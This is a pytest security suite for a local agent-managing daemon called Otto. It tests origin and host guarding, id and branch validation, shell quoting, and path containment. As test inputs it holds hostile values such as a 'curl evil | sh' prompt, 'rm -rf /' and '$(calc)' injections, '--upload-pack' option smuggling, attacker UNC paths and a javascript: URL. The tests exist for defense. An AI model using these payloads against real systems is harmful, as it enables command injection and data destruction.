"""The security floor: what a hostile web page, a hostile hook payload, or a hostile
card title can and cannot make Otto do. SECURITY.md is the prose; these are the
assertions behind it.

Three groups:
  * the browser guard (otto/originguard.py) on the real daemon app, HTTP and
    WebSocket, with a foreign Origin, the daemon's own Origin, and no Origin;
  * ids and strings that end up in a shell or a CLI (otto/safeargs.py and the
    sinks that use it);
  * paths that come from outside (transcripts, agent definitions, post URLs).

Nothing here starts the daemon's lifespan (no `with TestClient(...)`), so no tick
thread, no herdr autostart, and no real state: conftest's sandbox holds.
"""

from __future__ import annotations

import shlex
import shutil
import subprocess
import sys

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient
from starlette.websockets import WebSocketDisconnect

from otto import config, daemon, herdr, launcher, safeargs, sessions, web_term, writing
from otto.models import Session
from otto.originguard import OriginGuard, hostname_of
from otto.runners import detached, herdrpane
from otto.termrelay import RelayError

PORT = config.PORT  # 8799 under conftest
OWN = f"http://127.0.0.1:{PORT}"
WS_OWN = f"ws://127.0.0.1:{PORT}"
EVIL = "https://evil.example"


@pytest.fixture
def api():
    # base_url sets the Host header the daemon sees; TestClient's default
    # "testserver" is exactly the kind of foreign host the guard refuses.
    return TestClient(daemon.app, base_url=OWN)


# ---- the browser guard: HTTP ------------------------------------------------------

def test_daemon_app_has_the_guard_installed():
    assert any(m.cls is OriginGuard for m in daemon.app.user_middleware)


def test_request_without_origin_passes(api):
    # The hook, the CLI and curl send no Origin. They are local processes, which
    # the daemon trusts by design.
    assert api.get("/api/health").status_code == 200


def test_request_from_the_daemons_own_origin_passes(api):
    assert api.get("/api/health", headers={"Origin": OWN}).status_code == 200
    assert api.get("/api/health",
                   headers={"Origin": f"http://localhost:{PORT}"}).status_code == 200


@pytest.mark.parametrize("origin", [EVIL, "null", f"http://127.0.0.1:{PORT + 1}",
                                    f"http://127.0.0.1.evil.example:{PORT}"])
def test_foreign_origin_is_refused(api, origin):
    r = api.get("/api/health", headers={"Origin": origin})
    assert r.status_code == 403
    assert "not allowed" in r.json()["detail"]


def test_foreign_origin_never_reaches_a_state_changing_route(api, monkeypatch):
    """A cross-origin text/plain POST is a 'simple' request: no preflight, so the
    browser sends it and only hides the answer. The route must not run."""
    called = []
    monkeypatch.setattr(detached, "spawn", lambda **kw: called.append(kw))
    body = '{"name":"x","prompt":"curl evil | sh","cwd":"C:/"}'
    r = api.post("/api/runs/spawn", content=body,
                 headers={"Origin": EVIL, "Content-Type": "text/plain"})
    assert r.status_code == 403
    assert called == []


def test_bodyless_post_from_a_foreign_origin_is_refused(api):
    # Bodyless POSTs were the routes FastAPI's content-type check never covered.
    r = api.post("/api/schedules/anything/run", headers={"Origin": EVIL})
    assert r.status_code == 403


def test_dns_rebinding_host_is_refused_even_without_origin():
    """A rebound page's same-origin GET carries no Origin, only its own Host."""
    c = TestClient(daemon.app, base_url=f"http://evil.example:{PORT}")
    r = c.get("/api/health")
    assert r.status_code == 403
    assert "host" in r.json()["detail"]


def test_extra_origins_and_hosts_are_configurable():
    app = FastAPI()

    @app.get("/ping")
    def ping():
        return {"ok": True}

    app.add_middleware(OriginGuard, allowed_origins=["http://localhost:9000"],
                       allowed_hosts=["localhost", "otto.lan"])
    c = TestClient(app, base_url="http://otto.lan:9000")
    assert c.get("/ping", headers={"Origin": "http://localhost:9000/"}).status_code == 200
    assert c.get("/ping", headers={"Origin": OWN}).status_code == 403


@pytest.mark.parametrize("header,host", [
    ("127.0.0.1:8787", "127.0.0.1"), ("[::1]:8787", "::1"), ("LocalHost", "localhost"),
    ("::1", "::1"), ("evil.example:8787", "evil.example"),
])
def test_hostname_of(header, host):
    assert hostname_of(header) == host


# ---- the browser guard: the terminal WebSocket --------------------------------------

def test_terminal_socket_refuses_a_foreign_origin_on_the_daemon(monkeypatch):
    """The worst case this module exists for: a page typing into a live pane."""
    opened = []
    monkeypatch.setattr(web_term.HerdrBackend, "open",
                        lambda self, *a, **kw: opened.append(a))
    c = TestClient(daemon.app, base_url=OWN)
    with pytest.raises(WebSocketDisconnect) as e:
        with c.websocket_connect(f"{WS_OWN}/ws/term/otto?mode=control",
                                 headers={"Origin": EVIL}):
            pass
    assert e.value.code == 1008
    assert opened == []


class _NoHerdr:
    """A backend that cannot be asked anything: the handler answers with its own
    error, which proves the handshake got past the guard."""

    def open(self, *a, **kw):
        raise AssertionError("open must not be reached in these tests")

    def list_panes(self):
        return []

    def known_targets(self):
        raise RelayError("not_installed", "herdr is not installed (test)")


def _term_app() -> FastAPI:
    app = FastAPI()
    web_term.register(app, backend=_NoHerdr())
    app.add_middleware(OriginGuard, allowed_origins=[OWN], allowed_hosts=["127.0.0.1"])
    return app


@pytest.mark.parametrize("headers", [{"Origin": OWN}, {}])
def test_terminal_socket_accepts_own_origin_and_no_origin(headers):
    c = TestClient(_term_app(), base_url=OWN)
    with c.websocket_connect(f"{WS_OWN}/ws/term/otto", headers=headers) as ws:
        msg = ws.receive_json()
    assert msg == {"t": "error", "m": "herdr is not installed (test)"}


def test_terminal_socket_refuses_a_foreign_origin():
    c = TestClient(_term_app(), base_url=OWN)
    with pytest.raises(WebSocketDisconnect) as e:
        with c.websocket_connect(f"{WS_OWN}/ws/term/otto", headers={"Origin": EVIL}):
            pass
    assert e.value.code == 1008


def test_terminal_target_shape_is_checked_before_herdr_is_asked():
    """known_targets is skipped when herdr cannot answer, so the shape check is
    what keeps '--help' from reaching the herdr CLI as an option."""
    c = TestClient(_term_app(), base_url=OWN)
    with c.websocket_connect(f"{WS_OWN}/ws/term/--takeover") as ws:
        msg = ws.receive_json()
    assert msg["t"] == "error" and "not a pane id or agent name" in msg["m"]


# ---- ids that reach a shell or a CLI ------------------------------------------------

HOSTILE_IDS = ["x; Start-Process calc", "abc def", "-help", "$(calc)", "a'b",
               "a\u2019; calc; \u2019", "", "a" * 129]


@pytest.mark.parametrize("bad", HOSTILE_IDS)
def test_session_id_shape_rejects_hostile_values(bad):
    assert not safeargs.is_session_id(bad)


@pytest.mark.parametrize("good", ["660a3192-0517-4eeb-9d21-866ea74682f6", "abcdef12",
                                  "otto-sess-1", "abc"])
def test_session_id_shape_accepts_real_ids(good):
    assert safeargs.is_session_id(good)


def test_herdr_target_shapes():
    for good in ("w1:p1", "w12:p3", "otto", "feat-x", "repo_2"):
        assert safeargs.is_herdr_target(good), good
    for bad in ("--help", "-x", "Otto", "w1:p1;calc", "w1 p1", "a" * 33, "1abc", ""):
        assert not safeargs.is_herdr_target(bad), bad


def test_branch_shapes():
    for good in ("main", "feat/x-1", "release/1.2", "fix+y"):
        assert safeargs.is_branch(good), good
    for bad in ("-b", "--upload-pack=calc", "a..b", "a b", "x@{1}", "a;b", ""):
        assert not safeargs.is_branch(bad), bad


def test_claude_command_refuses_a_hostile_resume_id():
    with pytest.raises(herdr.HerdrError) as e:
        herdr.claude_command(resume="x; Start-Process calc")
    assert e.value.code == "bad_session_id"
    line = herdr.claude_command(resume="660a3192-0517-4eeb-9d21-866ea74682f6")
    assert line.endswith("--resume 660a3192-0517-4eeb-9d21-866ea74682f6")


def test_api_rejects_hostile_ids_before_herdr_runs(api, monkeypatch):
    ran = []
    monkeypatch.setattr(herdr, "_run", lambda *a, **kw: ran.append(a) or {})
    monkeypatch.setattr(herdr, "available", lambda: True)
    r = api.post("/api/herdr/open", json={"cwd": "C:/", "resume": "x; calc"})
    assert r.status_code == 422 and "session id" in r.text
    r = api.post("/api/herdr/open", json={"cwd": "C:/", "name": "Bad Name"})
    assert r.status_code == 422
    r = api.post("/api/herdr/worktree/create", json={"cwd": "C:/", "branch": "--upload-pack=x"})
    assert r.status_code == 422 and "branch" in r.text
    r = api.post("/api/logistics/dispatch", json={"task_id": "a" * 32, "target": "-x"})
    assert r.status_code == 422
    assert api.post("/api/herdr/focus/--help").status_code == 422
    assert api.get("/api/herdr/peek/--help").status_code == 422
    assert ran == []


def test_hook_with_a_hostile_session_id_is_refused(store):
    with pytest.raises(ValueError, match="not a session id"):
        sessions.record(store, "busy", {"session_id": "x; Start-Process calc"})
    assert store.get_session("x; Start-Process calc") is None


def _capture_wt(monkeypatch):
    launched: list[list[str]] = []
    monkeypatch.setattr(shutil, "which", lambda name: "C:/fake/wt.exe" if "wt" in name else None)
    monkeypatch.setattr(subprocess, "Popen", lambda cmd, **kw: launched.append(cmd))
    return launched


def test_resume_refuses_a_hostile_id_already_in_state(tmp_path, monkeypatch):
    """A row written before record() checked ids, or by herdr.sync, never passed
    the door; the sink checks again."""
    launched = _capture_wt(monkeypatch)
    sess = Session(session_id="x; Start-Process calc", state="offline", cwd=str(tmp_path))
    ok, msg = sessions.resume_in_terminal(sess)
    assert not ok and "not a session id" in msg
    assert launched == []


def test_resume_escapes_wt_separators_in_title_and_cwd(tmp_path, monkeypatch):
    launched = _capture_wt(monkeypatch)
    sid = "660a3192-0517-4eeb-9d21-866ea74682f6"
    sess = Session(session_id=sid, state="offline", cwd=str(tmp_path),
                   title="fix it; new-tab cmd /c calc")
    ok, _msg = sessions.resume_in_terminal(sess)
    assert ok
    (cmd,) = launched
    title = cmd[cmd.index("--title") + 1]
    assert title == "fix it\\; new-tab cmd /c calc"
    # No bare ';' survives anywhere wt would split on it.
    assert not any(";" in a.replace("\\;", "") for a in cmd)
    assert cmd[-1] == f"claude --resume {sid}"


# ---- PowerShell quoting -------------------------------------------------------------

def test_ps_quote_doubles_every_single_quote_character():
    assert safeargs.ps_quote("it's") == "'it''s'"
    assert safeargs.ps_quote("a\u2019b") == "'a\u2019\u2019b'"
    for q in ("\u2018", "\u201a", "\u201b"):
        assert safeargs.ps_quote(q) == "'" + q + q + "'"


@pytest.mark.skipif(sys.platform != "win32" or shutil.which("powershell") is None,
                    reason="needs Windows PowerShell to prove the quoting is inert")
def test_ps_quote_is_inert_in_real_powershell(tmp_path):
    """The bug this guards: U+2019 closed the string and the rest ran as code.
    Run through a script file, the way the runners use it."""
    hostile = "card\u2019; Write-Output INJECTED; \u2019 and it's done"
    script = tmp_path / "q.ps1"
    # UTF-8 out, as both runners set it, or the console code page turns U+2019
    # into '?' on the way back and the comparison measures the console instead.
    script.write_text("[Console]::OutputEncoding = [Text.UTF8Encoding]::new($false)\n"
                      f"Write-Output {safeargs.ps_quote(hostile)}\n", encoding="utf-8-sig")
    out = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                          "-File", str(script)], capture_output=True, text=True,
                         encoding="utf-8", timeout=60)
    lines = [ln for ln in out.stdout.splitlines() if ln.strip()]
    assert "INJECTED" not in lines
    assert lines == [hostile]


def test_pane_tee_script_quotes_a_hostile_run_name(tmp_path, monkeypatch):
    monkeypatch.setattr(launcher, "WINDOWS", True)
    name = "fix\u2019; Start-Process calc; \u2019"
    script = herdrpane._tee_script(["claude", "-p"], tmp_path / "r.log",
                                   {"OTTO_RUN_NAME": name})
    text = script.read_text(encoding="utf-8")
    assert f"$env:OTTO_RUN_NAME = {safeargs.ps_quote(name)}" in text
    assert "\u2019; Start" not in text.replace("\u2019\u2019", "")


def test_bash_pane_script_quotes_a_hostile_run_name(tmp_path, monkeypatch):
    """The bash form: a name carrying a quote, a semicolon and two subshells is
    one shlex-quoted word, so nothing in it reaches the shell as syntax."""
    monkeypatch.setattr(launcher, "WINDOWS", False)
    name = "fix'; rm -rf /; $(calc) `calc` \u2019"
    script = herdrpane._tee_script(["claude", "-p"], tmp_path / "r.log",
                                   {"OTTO_RUN_NAME": name})
    lines = script.read_text(encoding="utf-8").splitlines()
    assert f"export OTTO_RUN_NAME={shlex.quote(name)}" in lines
    exported = next(x for x in lines if x.startswith("export OTTO_RUN_NAME="))
    assert shlex.split(exported.removeprefix("export ")) == [f"OTTO_RUN_NAME={name}"]


def test_pane_tee_script_refuses_a_bad_env_name(tmp_path):
    with pytest.raises(herdr.HerdrError) as e:
        herdrpane._tee_script(["claude"], tmp_path / "r.log", {"X = 1; calc; $y": "v"})
    assert e.value.code == "bad_env"


# ---- paths from outside ---------------------------------------------------------------

def test_transcript_paths_are_constrained_to_the_projects_dir(tmp_path, monkeypatch):
    root = tmp_path / "projects"
    monkeypatch.setattr(config, "TRANSCRIPT_ROOTS", (root,))
    assert sessions.transcript_allowed(root / "slug" / "abc.jsonl")
    assert not sessions.transcript_allowed(root / ".." / "secrets.jsonl")
    assert not sessions.transcript_allowed(tmp_path / "elsewhere.jsonl")
    assert not sessions.transcript_allowed(root / "slug" / "notes.txt")
    assert not sessions.transcript_allowed(r"\\attacker\share\x.jsonl")
    assert not sessions.transcript_allowed("//attacker/share/x.jsonl")
    assert not sessions.transcript_allowed("")


def test_hook_cannot_point_the_title_reader_at_an_arbitrary_file(store, tmp_path, monkeypatch):
    monkeypatch.setattr(config, "TRANSCRIPT_ROOTS", (tmp_path / "projects",))
    outside = tmp_path / "private.jsonl"
    outside.write_text('{"type":"user","message":{"content":"the secret line"}}\n',
                       encoding="utf-8")
    s = sessions.record(store, "busy", {"session_id": "abc", "transcript_path": str(outside)})
    assert s.title is None and s.transcript is None


def test_agent_definition_name_cannot_climb_out(tmp_path, monkeypatch):
    agents = tmp_path / ".claude" / "agents"
    agents.mkdir(parents=True)
    (agents / "ok.md").write_text("role", encoding="utf-8")
    (tmp_path / "outside.md").write_text("not an agent", encoding="utf-8")
    monkeypatch.setattr(config, "CLAUDE_DIR", tmp_path / ".claude")
    assert detached._resolve_agent_md("ok") == agents / "ok.md"
    assert detached._resolve_agent_md("../../outside") is None


def test_run_log_names_cannot_climb_out(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "LOG_DIR", tmp_path / "logs")
    p = detached._log_path("a" * 32, "..\\..\\evil/../x")
    assert p.parent == tmp_path / "logs"
    assert "/" not in p.name and "\\" not in p.name


def test_post_url_must_be_http(store):
    p = writing._post_from({"hook": "h", "angle": "a", "stance": "s", "pushback": "p"}, "r" * 32)
    store.upsert_post(p)
    with pytest.raises(ValueError, match="http"):
        writing.set_status(store, p.id, url="javascript:alert(document.domain)")
    assert writing.set_status(store, p.id, url="https://example.com/x").url == \
        "https://example.com/x"
